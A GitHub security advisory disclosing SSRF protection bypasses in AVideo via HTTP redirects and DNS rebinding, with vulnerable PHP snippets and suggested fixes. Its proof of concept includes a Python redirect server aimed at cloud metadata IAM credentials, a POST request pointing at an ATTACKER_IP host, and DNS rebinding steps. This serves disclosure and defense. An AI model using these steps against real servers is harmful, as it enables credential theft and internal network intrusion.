# [H] AVideo has SSRF Protection Bypass via HTTP Redirect and DNS Rebinding in isSSRFSafeURL()

## Summary
Severity: High
Advisory: GHSA-2hch-c97c-g99x
CVE: CVE-2026-43884
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-2hch-c97c-g99x
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary

Two endpoints in AVideo call `isSSRFSafeURL()` to validate user-supplied URLs, then fetch them using bare `file_get_contents()` **without disabling PHP's automatic redirect following**. An attacker can supply a URL pointing to a server they control that returns a 302 redirect to an internal/cloud-metadata address (e.g., `http://169.254.169.254/latest/meta-data/`). Since `isSSRFSafeURL()` only validates the *initial* URL, the redirect target bypasses all SSRF protections.

A secondary finding is that 6+ callers of `isSSRFSafeURL()` discard the `$resolvedIP` out-parameter meant for DNS pinning, leaving them vulnerable to DNS rebinding TOCTOU attacks.

**Severity:** High — CVSS 3.1: 7.7 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

### Details

#### Finding 1: Redirect-Based SSRF Bypass

**Vulnerable code — `plugin/AI/receiveAsync.json.php` (line ~162–165):**

```php
// SSRF Protection: Validate URL before fetching
if (!isSSRFSafeURL($imageUrl)) {
    // blocked
} else {
    $imageContent = file_get_contents($imageUrl);  // ← FOLLOWS REDIRECTS!
}
```

**Vulnerable code — `objects/EpgParser.php` (line ~358–362):**

```php
if (!isSSRFSafeURL($this->url)) {
    throw new \RuntimeException('URL blocked by SSRF protection');
}
$this->content = @file_get_contents($this->url);  // ← FOLLOWS REDIRECTS!
```

**Safe code for comparison — `objects/functions.php`, `url_get_contents()`:**

```php
$opts = ['http' => ['follow_location' => 0]];  // Disable auto-redirect
$context = stream_context_create($opts);
for ($redirectCount = 0; $redirectCount <= 5; $redirectCount++) {
    $fetched = file_get_contents($currentUrl, false, $context);
    // ... parse Location header ...
    if ($redirectTarget) {
        if (!isSSRFSafeURL($redirectTarget)) {  // Re-validates EACH hop
            return false;
        }
        $currentUrl = $redirectTarget;
        continue;
    }
    $tmp = $fetched;
    break;
}
```

**Root cause:** The SSRF redirect protection (`follow_location=0` + manual redirect loop with per-hop `isSSRFSafeURL()` re-validation) was correctly implemented in `url_get_contents()` but NOT propagated to these two endpoints that call `file_get_contents()` directly. PHP's default `follow_location` is `1` (follow redirects).

#### Finding 2: DNS Rebinding TOCTOU (Multiple Callers)

`isSSRFSafeURL()` provides a `$resolvedIP` out-parameter for DNS pinning via `CURLOPT_RESOLVE`. Only 1 of 9 callers (`plugin/LiveLinks/proxy.php`) uses it. The remaining 8 callers discard it and pass the original hostname to the fetching function, which resolves DNS independently — creating a TOCTOU race window exploitable via DNS rebinding (TTL=0).

**Affected callers (no DNS pinning):**
- `objects/aVideoEncoderReceiveImage.json.php` — 4 call sites
- `objects/aVideoEncoder.json.php` — 1 call site
- `plugin/BulkEmbed/save.json.php` — 1 call site
- `plugin/AI/receiveAsync.json.php` — 1 call site
- `objects/EpgParser.php` — 1 call site
- `plugin/Scheduler/Scheduler.php` — 1 call site

### PoC

#### Redirect Bypass PoC

1. Attacker runs an HTTP server that returns a 302 redirect:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        self.end_headers()

HTTPServer(("0.0.0.0", 8888), RedirectHandler).serve_forever()
```

2. Attacker triggers AI image generation and intercepts the callback:

```
POST /plugin/AI/receiveAsync.json.php
Content-Type: application/x-www-form-urlencoded

type=image&token=VALID_TOKEN&ai_responses_id=ID&response[data][0][url]=http://ATTACKER_IP:8888/redir
```

3. `isSSRFSafeURL("http://ATTACKER_IP:8888/redir")` resolves attacker IP → public → **passes**
4. `file_get_contents("http://ATTACKER_IP:8888/redir")` follows 302 to `http://169.254.169.254/...` — **no SSRF re-check occurs**
5. Cloud metadata (including IAM credentials) is saved as a video thumbnail, retrievable by the attacker

**Control test:** Replace the redirect target with a legitimate public URL — `isSSRFSafeURL()` passes and the content is fetched normally, confirming the function works for non-malicious URLs.

#### DNS Rebinding PoC

1. Configure a domain with TTL=0 DNS that alternates:
   - First query: public IP (passes `isSSRFSafeURL`)
   - Second query: `127.0.0.1` (reaches internal services)
2. Submit `http://rebind.attacker.com/image.jpg` to any affected endpoint
3. `isSSRFSafeURL()` resolves → public IP → passes (discards `$resolvedIP`)
4. `url_get_contents()` / `file_get_contents()` resolves again → `127.0.0.1` → SSRF achieved

### Impact

An authenticated attacker can force the AVideo server to make HTTP requests to arbitrary internal hosts, including:
- **Cloud metadata endpoints** (169.254.169.254) — exfiltrate IAM credentials, instance identity
- **Internal services** on localhost or private network (databases, admin panels, monitoring)
- **Port scanning** of the internal network using the server as a proxy

The exfiltrated data is stored as video thumbnails/images, making it retrievable through the application's public interface.

### Suggested Fix

**Fix 1 (Redirect bypass — immediate):** Route both affected files through `url_get_contents()` which already handles redirects safely, or add explicit no-redirect context:
```php
$ctx = stream_context_create(['http' => ['follow_location' => 0]]);
$imageContent = file_get_contents($imageUrl, false, $ctx);
```

**Fix 2 (DNS rebinding — defense-in-depth):** Update all callers to capture `$resolvedIP` and pass it to a DNS-pinning-aware fetch function using `CURLOPT_RESOLVE`.

### Credit

Kai Aizen <kai.aizen.dev@gmail.com>

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-2hch-c97c-g99x
- https://github.com/WWBN/AVideo/security/advisories/GHSA-2hch-c97c-g99xg
- https://nvd.nist.gov/vuln/detail/CVE-2026-43884
- https://github.com/WWBN/AVideo/commit/603e7bf77a835584387327e35560262feb075db3
- https://github.com/WWBN/AVideo
